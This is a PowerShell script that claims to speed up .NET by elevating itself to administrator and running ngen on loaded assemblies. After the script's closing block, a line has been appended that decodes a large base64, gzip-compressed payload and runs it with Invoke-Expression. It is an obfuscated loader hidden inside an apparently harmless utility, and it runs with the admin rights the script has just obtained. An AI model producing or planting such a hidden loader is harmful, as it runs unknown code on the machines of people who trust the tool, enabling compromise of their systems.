﻿









Begin{

}

Process{
	
	if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		$Arguments = "& '" + $MyInvocation.MyCommand.Definition + "'"
		Start-Process PowerShell.exe -Verb RunAs -ArgumentList $Arguments
		Break
	}

	Write-Host -Object "Start optimization..." -ForegroundColor Yellow

	
	$ngen_path = Join-Path -Path $env:windir -ChildPath "Microsoft.NET"

	if($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
	{
		$ngen_path = Join-Path -Path $ngen_path -ChildPath "Framework64\ngen.exe"
	}
	else
	{
		$ngen_path = Join-Path -Path $ngen_path -ChildPath "Framework\ngen.exe"
	}

	
	$ngen_application_path = (Get-ChildItem -Path $ngen_path -Filter "ngen.exe" -Recurse | Where-Object {$_.Length -gt 0} | Select-Object -Last 1).Fullname

	Set-Alias -Name ngen -Value $ngen_application_path

	
	[System.AppDomain]::CurrentDomain.GetAssemblies() | foreach { ngen install $_.Location /nologo /verbose}

	Write-Host -Object "Optimization finished!" -ForegroundColor Green

	Write-Host -Object "Press any key to continue..."
	[void]$host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

End{

}
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

